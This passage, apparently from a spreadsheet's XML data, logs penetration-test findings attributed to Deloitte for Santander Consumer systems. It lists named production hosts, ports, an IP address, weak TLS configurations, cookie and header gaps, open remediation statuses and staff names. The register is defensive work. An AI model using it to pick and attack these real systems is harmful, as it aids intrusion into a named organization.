    <s v="De no configurar correctamente el servidor y/o la aplicación web para no permitir ataques de Clickjacking, un atacante podría llevar a cabo un secuestro de sesión mediante un previo ataque de Phishing para provocar que el usuario legítimo acceda a la página maliciosa. _x000a_El riesgo de este tipo de vulnerabilidad se establece como bajo por la dificultad de realizar un ataque con éxito. Para ello, sería necesario dirigir la navegación de un usuario a un sitio controlado por un atacante, posiblemente con una URL similar a la de la aplicación legítima. En ese sitio, una página HTML contendría un frame que carga la página legítima de la aplicación afectada. En dicho caso, por ejemplo, entrarían en juego aspectos tales como el certificado del servidor del atacante y la URL, que provocaría una alerta del navegador al usuario y tendría que aceptar o pasar por alto que no son propios de la aplicación."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jenny Rodriguez_x000a_Alexander Parra"/>
  </r>
  <r>
    <n v="59"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-66546e42c382686af2c855f8"/>
    <s v="SCO-24-CNMPA-005-AP-003"/>
    <x v="37"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <s v="443"/>
    <m/>
    <d v="2024-05-27T11:28:02"/>
    <n v="756.52219907407562"/>
    <d v="2024-09-24T11:28:02"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Ciertos tipos de ficheros, como imágenes, PDFs o documentos de Microsoft Office almacenan información en forma de metadatos, tales como autor, fecha de creación, nombre de equipo, direccionamiento IP, o tecnologías utilizadas. La aplicación web analizada alberga varios ficheros PDF que contienen metadatos y que proporcionan información interna de nombres de usuario de los empleados. Los endpoints desde los que se pueden descargar los documentos afectados son los siguientes: _x000a_• https://santanderfinancing.com/wp-content/uploads/2022/03/11_08_2021_CODIGO_DE_ETICA_Y_CONDUCTA.pdf _x000a_• https://santanderfinancing.com/wp-content/uploads/2022/03/BSNC-SC-Terminos-y-Condiciones-de-Seguros-para-Credito-de-Consumo.pdf _x000a_• https://santanderfinancing.com/wp-content/uploads/2022/08/BSNC-Terminos-y-Condiciones-de-Seguros-para-Credito-de-Vehiculo.pdf_x000a_En la evidencia pueden observarse los metadatos de “autor” presentes en los documentos “11_08_2021_CODIGO_DE_ETICA_Y_CONDUCTA.pdf”, “BSNC-SC-Terminos-y-Condiciones-de-Seguros-para-Credito-de-Consumo.pdf” y “BSNC-Terminos-y-Condiciones-de-Seguros-para-Credito-de-Vehiculo.pdf” los cuales revelan nombres de empleados de la organización"/>
    <s v="Se recomienda eliminar toda la información contenida en los metadatos de los documentos generados y/o publicados en la aplicación. De manera adicional, se puede implementar un procedimiento para controlar los documentos a publicar, garantizando que los mismos no contengan información sensible de la organización en sus metadatos."/>
    <s v="La información contenida en los metadatos de los archivos identificados podría ser utilizada por un atacante para obtener un mayor conocimiento de la organización, en este caso para identificar los empleados que trabajan en esta aplicación. Con esta información, el atacante puede planificar ataques de ingeniería social o Phishing para obtener el control sobre el activo."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="60"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-66546ee8c382686af2c855f9"/>
    <s v="SCO-24-CNMPA-005-CO-004"/>
    <x v="38"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <s v="443"/>
    <m/>
    <d v="2024-05-27T11:30:48"/>
    <n v="756.5202777777813"/>
    <d v="2024-09-24T11:30:48"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor afectado puede realizar consultas sobre servidores DNS externos. Para ello un atacante necesita forzar al servidor a realizar una consulta a un dominio controlado por el propio atacante. _x000a_Esta consulta se puede forzar de varias maneras como, por ejemplo, forzando al aplicativo a solicitar un recurso en el dominio controlado por el atacante. _x000a_En este caso, el parámetro vulnerable es la cabecera &quot;Host&quot; en cualquier petición que se realice. _x000a_Durante las pruebas realizadas se ha comprobado que el servidor realiza una consulta DNS cuando se envían ciertas peticiones HTTP sobre el aplicativo._x000a__x000a_Durante las pruebas realizadas se ha comprobado que el servidor realiza una consulta DNS cuando se envían ciertas peticiones HTTP sobre el aplicativo, en este caso en el puerto 4443._x000a_"/>
    <s v="Se recomienda, en caso de no ser necesario, deshabilitar la configuración del servidor para que no se le permita realizar consultas DNS a un servidor externo. En su lugar configurar el servidor afectado para que utilice un servidor DNS interno o de la DMZ."/>
    <s v="Dado que el servidor remoto realiza una consulta DNS existen ciertos datos del sistema que inició la consulta que quedarían expuestos en el servidor DNS controlado por un atacante. De esta manera, un atacante podría obtener más información sobre el equipo remoto, por ejemplo la dirección IP del mismo. _x000a__x000a_Otro riesgo asociado a este tipo de vulnerabilidad es que se puede utilizar el sistema afectado como proxy para el envío de payloads tipo DNS o incluso como proxy en técnicas de exfiltración de datos vía DNS. En ambos casos, la dirección del Servidor DNS del atacante permanece oculta y se mostraría la dirección IP del servidor afectado como originaria del ataque."/>
    <s v="1° Fecha: 28/02/2025_x000a__x000a_2°Sin fecha "/>
    <s v="Aun se estan realizando las validaciones correspondientes para realizar la mitigacion "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="61"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <s v="MAN-665f40043d46490637e0df3d"/>
    <s v="SC0-24-CNMPO-002-CO-004"/>
    <x v="34"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co:8001/OriginacionPROD/"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-04T16:25:40"/>
    <n v="748.31550925925694"/>
    <d v="2024-10-02T16:25:40"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-12-05T00:00:00"/>
    <s v="Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones._x000a__x000a_La herramienta &quot;testssl&quot; que demuestra que el activo es vulnerable a BREACH"/>
    <s v="Se recomienda deshabilitar la compresión HTTP por completo, reduciendo el rendimiento. _x000a_Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una petición entre sitios cruzados, o cuando la cabecera no está presente. Este enfoque permite una mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de rendimiento en las solicitudes afectadas. _x000a_A continuación, se muestra cómo se deshabilita la compresión HTTP para Apache y NGINX: _x000a__x000a_Deshabilitar compresión en Apache: _x000a_●Deshabilite el módulo mod_deflate utilizando el siguiente comando: _x000a_$ sudo a2dismod deflate _x000a_●Reinicie el servidor: _x000a_$ sudo /etc/init.d/apache2 restart Deshabilitar compresión en NGINX: _x000a_●Establezca la configuración del host con la opción gzip en off: server {_x000a_server_name www.example.com;_x000a_ listen 443 ssl http2; _x000a_gzip off; _x000a_}"/>
    <s v="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 de sesión, etc.)."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jenny Rodriguez_x000a_Alexander Parra"/>
  </r>
  <r>
    <n v="62"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <s v="MAN-665f405e3d46490637e0dfab"/>
    <s v="SC0-24-CNMPO-002-CO-005"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co:8001/OriginacionPROD/"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-04T16:27:10"/>
    <n v="748.31446759259416"/>
    <d v="2024-10-02T16:27:10"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso . _x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. _x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: _x000a_•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1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="63"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="MFT"/>
    <s v="MAN-66621fd73d46490637ec5b38"/>
    <s v="SCO-24-CNMPO-006-CO-005"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.7999999523162842"/>
    <m/>
    <m/>
    <s v="mft.santanderconsumer.co"/>
    <m/>
    <m/>
    <d v="2024-06-06T20:45:11"/>
    <n v="746.13528935184877"/>
    <d v="2024-10-04T20:45:11"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso. Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. _x000a__x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: _x000a_•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m/>
    <m/>
    <s v="Jorge Guzman"/>
  </r>
  <r>
    <n v="64"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-6673fe08bb0dea0e40f43ace"/>
    <s v="SCO-24-CNMPO-008-AP-001"/>
    <x v="39"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-20T10:01:44"/>
    <n v="732.58212962962716"/>
    <d v="2024-10-18T10:01:44"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación expone un script en la ruta /cgi-bin/ el cual ha sido descubierto mediante la_x000a_herramienta dirsearch, en este caso en el script no se muestra la información sobre las variables_x000a_de entorno ni se puede ejecutar código sobre este script."/>
    <s v="Eliminar o deshabilitar scripts innecesarios o que no se utilicen."/>
    <s v="La exposición de scripts CGI sin control en el servidor, como /cgi-bin/test-cgi, puede permite a atacantes ejecutar comandos arbitrarios o acceder a datos sensibles, comprometiendo seriamente la seguridad, integridad y disponibilidad del sistema afectado."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="65"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-6673fe72bb0dea0e40f44da9"/>
    <s v="SCO-24-CNMPO-008-CO-002"/>
    <x v="29"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-20T10:03:30"/>
    <n v="732.58090277777956"/>
    <d v="2024-10-18T10:03:30"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad Browser Exploit Against SSL/TLS o BEAST se produce mediante el cifrado de datos en modo CBC con vectores de inicialización encadenados, lo que permite a los atacantes intermedios obtener encabezados HTTP de texto sin formato."/>
    <s v="Configurar los servidores SSL/TLS para soportar únicamente TLS 1.3 o TLS 1.2 si es compatible. Además, configure los servidores SSL/TLS para que solo sean compatibles con los conjuntos de cifrado que no usan algoritmos de cifrado por bloque (CBC)."/>
    <s v="La vulnerabilidad CBC puede permitir ataques contra SSL para descifrar y obtener información sensible transmitida entre el navegador del usuario y el servidor de la aplicación tales como identificadores de sesión del usuario, credenciales, etc."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="66"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-6673fee0bb0dea0e40f46116"/>
    <s v="SCO-24-CNMPO-008-CO-003"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.0999999046325684"/>
    <s v="CVE-2013-0169"/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-20T10:05:20"/>
    <n v="732.57962962963211"/>
    <d v="2024-10-18T10:05:20"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso. _x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida._x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: _x000a_•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1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="67"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-668e29d187e64843c1d54e33"/>
    <s v="SCO-24-CNMPO-010-CO-003"/>
    <x v="10"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.2000000476837158"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <s v="4443"/>
    <m/>
    <d v="2024-07-10T06:27:29"/>
    <n v="712.73091435185052"/>
    <d v="2024-11-07T06:27:29"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="se ha comprobado que se muestra la versión de Apache y de OpenSSL que se está que se está ejecutando en el servidor en la cabecera de respuesta cabeceras de respuesta del servidor. Revelando información interna acerca del tipo de servidor y versión del mismo, así como información de la infraestructura interna de la aplicación a través de la dirección URL https://simplefinance.santanderfinancing.com:4443/SimpleFinance/login"/>
    <s v="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_x000a__x000a_https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="68"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-668e293e87e64843c1d54e32"/>
    <s v="SCO-24-CNMPO-010-AP-002"/>
    <x v="40"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.5999999046325684"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <s v="4443"/>
    <m/>
    <d v="2024-07-10T06:25:02"/>
    <n v="712.73261574074422"/>
    <d v="2024-11-07T06:25:02"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="se ha observado que las cookies asociadas a la gestión de la sesión no tiene aplicado el atributo de seguridad &quot;secure&quot;. Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;secure&quot;. De esta manera se evitando que el identificador de sesión pueda ser transmitido por canales no cifrados."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="69"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-5caba75a"/>
    <s v="SCO-22-CNMPA-003-AP-005"/>
    <x v="9"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="santanderfinancing.com"/>
    <s v="443"/>
    <m/>
    <d v="2022-09-01T09:55:12"/>
    <n v="1390.5866666666698"/>
    <d v="2022-12-30T09:55:12"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tiene aplicado el siguiente atributo de seguridad:_x000a_• HttpOnly – este atributo impide el robo de la cookie mediante ataques de Cross-Site-Scripting ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad &quot;HttpOnly&quot;, evitando que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX)."/>
    <s v="El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="70"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-09a3724f"/>
    <s v="SCO-22-CNMPA-009-CO-002"/>
    <x v="41"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2022-09-07T19:28:19"/>
    <n v="1384.1886689814783"/>
    <d v="2023-01-05T19:28:19"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha observado la existencia de un recurso asociado a la compañía que expone información sensible acerca de la infraestructura interna de la misma. El servidor utilizado puede ser identificado a través de los encabezados provenientes de la respuesta del servidor._x000a_• Server: Apache."/>
    <s v="Se recomienda analizar la posibilidad de eliminar la información sensible expuesta a través de los recursos mencionados. Además, se recomienda actualizar los estándares de seguridad en el desarrollo y puesta en producción de servicios, de manera tal que contemple los riesgos asociados a la exposición de información sensible acerca de la infraestructura interna."/>
    <s v="La recolección de información es, usualmente, el primer paso para realizar un ataque. La exposición de información le provee a un individuo malicioso un mayor conocimiento acerca de la infraestructura y podría ser aprovechada para la planificación de ataques externos sobre los recursos de la compañía."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="71"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-09a476bc"/>
    <s v="SCO-22-CNMPO-006-CO-005"/>
    <x v="42"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U="/>
    <m/>
    <m/>
    <d v="2022-09-12T18:51:33"/>
    <n v="1379.2142013888879"/>
    <d v="2023-01-10T18:51:33"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El recurso afectado presenta debilidades en la utilización de cifrados obsoletos (CBC), los cuales corresponden a una vulnerabilidad llamada “Lucky13”."/>
    <s v="Se recomienda analizar la posibilidad de revisar si la configuración observada responde a un requisito de negocio. De lo contrario, se recomienda deshabilitar los cifrados obsoletos. Además, se recomienda revisar los estándares de configuración de los sistemas para asegurarse que las configuraciones TLS están en línea con las políticas de la organización, y asegurarse de que las configuraciones relacionadas sean consistentes con todas las aplicaciones accesibles desde internet."/>
    <s v="Si la configuración de suites de cifrado no contempla los aspectos mencionados, un atacante o usuario malicioso podría aprovechar las debilidades existentes en la validación de certificados para realizar un ataque de MITM (man-in-the-middle), y posteriormente intentar interceptar información potencialmente sensible."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="72"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-09a476bd"/>
    <s v="SCO-22-CNMPO-006-CO-006"/>
    <x v="43"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="3.7000000476837158"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/QXV0b0ZpbmFuY2U="/>
    <m/>
    <m/>
    <d v="2022-09-12T18:54:10"/>
    <n v="1379.2123842592628"/>
    <d v="2023-01-10T18:54:10"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha observado la existencia de un recurso asociado a la compañía que expone información sensible acerca de la infraestructura interna de la misma. A continuación, se detalla la información sensible que fue observada durante el análisis realizado:_x000a_La plataforma utilizada y su versión asociada puede ser identificada a través de los encabezados provenientes de la respuesta del servidor._x000a_• Server: Apache 2.4.37 (centos) OpenSSL/1.1.1k"/>
    <s v="Se recomienda analizar la posibilidad de eliminar la información sensible expuesta a través de los recursos mencionados. Además, se recomienda actualizar los estándares de seguridad en el desarrollo y puesta en producción de servicios, de manera tal que contemple los riesgos asociados a la exposición de información sensible acerca de la infraestructura interna, tales como nombres de hosts, direcciones IPs, versiones de software, path internos y nombres de usuarios."/>
    <s v="La recolección de información es, usualmente, el primer paso para realizar un ataque. La exposición de información le provee a un individuo malicioso un mayor conocimiento acerca de la infraestructura y podría ser aprovechada para la planificación de ataques externos sobre los recursos de la compañía. Además, el conocimiento acerca de las versiones de las plataformas utilizadas le permitiría a un individuo malicioso ejecutar ataques específicos para el software utilizado, incrementando la probabilidad de éxito en los mismos."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="73"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-6512d2dcf74e327f9d0969fc"/>
    <s v="SC-23-CNMPA-03-CO-005"/>
    <x v="44"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.4000000953674316"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com:4443/portalpagos/registerTransaction"/>
    <s v="4443"/>
    <m/>
    <d v="2023-09-26T12:47:24"/>
    <n v="1000.4670833333366"/>
    <d v="2024-01-24T12:47:24"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Al realizar la auditoría sobre el activo santanderfinancing.com:4443, se descubrió que la aplicación web no envía al usuario varias cabeceras HTTP orientadas a la seguridad. Las siguientes cabeceras no están presentes en las respuestas enviadas por el servidor:_x000a_• Strict-Transport-Security (HSTS): Fuerza SSL/TLS para todas las visitas posteriores al sitio durante los siguientes segundos máximos (por ejemplo, 1 año = 1536000 s). Ayuda a mitigar los ataques TLS-stripping basados en Man-in-the-Middle._x000a_• X-Content-Type-Options: Bloquea el contenido malicioso ocultado como un tipo MIME incorrecto._x000a_• X-Frame-Options: Notifica al navegador los permisos sobre que dominios pueden cargar las páginas de la aplicación._x000a_• Content-Security-Policy: Define las fuentes permitidas para scripts/imágenes/objetos/media._x000a_• X-XSS-Protection: Previene al navegador del usuario de la ejecución del contenido JavaScript inyectado por un atacante que se vea reflejado en las respuestas de la aplicación."/>
    <s v="Se recomienda aplicar la siguiente configuración en las cabeceras HTTP: _x000a_• Strict-Transport-Security: _x000a_o maxage 1536000; _x000a_o includeSubdomains considerar la precarga de páginas críticas a través de https://hstspreload.appspot.com/. • X-Content-Type-Options: _x000a_o Nosniff. _x000a_• X-Frame-Options: _x000a_o establezca &quot;deny&quot; si es posible, si se requiere enmarcar dentro del dominio, use &quot;sameorigin”. _x000a_• Content-Security-Policy: _x000a_o default-src https: 'self' _x000a_• X-XSS-Protection: _x000a_o “1; mode=block&quot;."/>
    <s v="Existen varias parametrizaciones incorrectas de cabeceras HTTP que podrían involucrar un vector de amenaza. _x000a_Cada una de las cabeceras tiene un impacto diferente en la aplicación que depende de su propia configuración: _x000a_• Strict-Transport-Security (HSTS): Permite a los servidores web declarar que los navegadores web solo deben interactuar con él mediante conexiones HTTPS seguras; si no estuviera configurado, permite que el navegador interactúe con el servidor a través del protocolo HTTP inseguro. _x000a_• X-Frame-Options: De no configurar correctamente el servidor y/o la aplicación Web para no permitir ataques de Clickjacking, un atacante podría llevar a cabo un secuestro de sesión mediante un previo ataque de phishing para provocar que el usuario legítimo acceda a la página maliciosa. _x000a_• X-Content-Type-Options: Bloquea el contenido malicioso disfrazado de un tipo MIME incorrecto. _x000a_• Content-Security-Policy: Define las fuentes permitidas para scripts/imágenes/objetos/media, si está mal configurado, el contenido malicioso de sitios externos podría cargarse en la aplicación web._x000a_• X-XSS-Protection: Puede permitir a un atacante realizar ataques de tipo XSS en caso de encontrarse un vector de ataque de este tipo. El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies y demás información sensible que un cliente pueda estar transmitiendo al sitio web."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="74"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-6512d40df74e327f9d0969fd"/>
    <s v="SC-23-CNMPA-03-CO-006"/>
    <x v="45"/>
    <m/>
    <x v="1"/>
    <s v="Low"/>
    <n v="3.2000000476837158"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com:4443/portalpagos/registerTransaction"/>
    <s v="4443"/>
    <m/>
    <d v="2023-09-26T12:52:29"/>
    <n v="1000.463553240741"/>
    <d v="2024-01-24T12:52:29"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que la cabecera “Server” revela información interna acerca del software/framework y versión del mismo utilizado para desarrollar la aplicación a través de las respuestas del servidor."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al software/framework y versión utilizado para desarrollar la propia aplicación. Para ello es necesario eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información._x000a__x000a_https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer la versión y tipo del software o framework utilizado para desarrollar el aplicativo permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma."/>
    <s v="1° Fecha: 28/02/2025"/>
    <s v="Solventada/pendiente de certificación "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="75"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-6512e744f74e327f9d096a22"/>
    <s v="SC-23-CNMPO-001-AP-008"/>
    <x v="40"/>
    <m/>
    <x v="0"/>
    <s v="Low"/>
    <n v="3.5999999046325684"/>
    <m/>
    <m/>
    <s v="https://64.76.176.202/factoring/index.seam"/>
    <s v="443"/>
    <m/>
    <d v="2023-09-26T14:14:28"/>
    <n v="1000.4066203703696"/>
    <d v="2024-01-24T14:14:28"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="Durante las pruebas realizadas, se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el atributo de seguridad &quot;secure&quot;. Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS."/>
